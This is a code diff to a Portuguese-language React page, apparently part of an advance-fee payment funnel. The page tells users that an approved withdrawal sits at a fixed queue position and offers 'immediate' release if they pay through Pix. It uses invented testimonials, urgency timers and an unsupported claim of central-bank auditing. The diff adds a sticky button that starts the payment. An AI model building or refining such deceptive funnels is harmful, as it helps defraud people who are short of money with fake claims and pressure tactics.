@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Loader2, Check, ChevronDown, ChevronUp, Clock } from "lucide-react";
+import StickyCtaBar from "./StickyCtaBar";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
@@ -12,7 +13,7 @@ const FunnelUpsellSaqueImediato = ({ balance, onGeneratePix, isGenerating, leadC
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
       <div className="bg-[#FF6F00] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">⏳ SEU SAQUE ESTÁ NA FILA — POSIÇÃO 847</h1></div>
-      <main className="px-3 py-4 max-w-lg mx-auto">
+      <main className="px-3 py-4 max-w-lg mx-auto pb-24">
         {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
         <div className="bg-[#FFF3E0] border border-[#FF9800] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">⏰</span><div><p className="text-gray-900 text-sm font-bold mb-1">Saque aprovado — aguardando processamento</p><p className="text-gray-700 text-xs leading-relaxed">Seu saque de <span className="font-bold">{balance}</span> foi aprovado, mas está na fila padrão. Previsão atual: <span className="font-bold text-orange-700">5 a 7 dias úteis</span>.</p></div></div></div>
         <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
@@ -31,6 +32,7 @@ const FunnelUpsellSaqueImediato = ({ balance, onGeneratePix, isGenerating, leadC
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem antecipou, recebeu na hora</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Amanda C." location="Rio de Janeiro, RJ" text="Ia esperar 7 dias, mas paguei a antecipação e em 1 minuto já tinha caído." time="1 min 23s" /><TestimonialCard img={testimonial2} name="Lucas P." location="Brasília, DF" text="Meu primo esperou a fila padrão e demorou 6 dias. Eu antecipei e recebi na hora." time="47s" /><TestimonialCard img={testimonial3} name="Patrícia F." location="Manaus, AM" text="Estava precisando do dinheiro urgente. Antecipei e caiu em menos de 2 minutos." time="1 min 58s" /></div></div>
         <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema de antecipação auditado pelo Banco Central</p></div>
       </main>
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"Receber " + balance + " em 2 Minutos"} bgColor="bg-[#FF6F00]" shadowColor="shadow-orange-200" />
     </div>
   );
 };
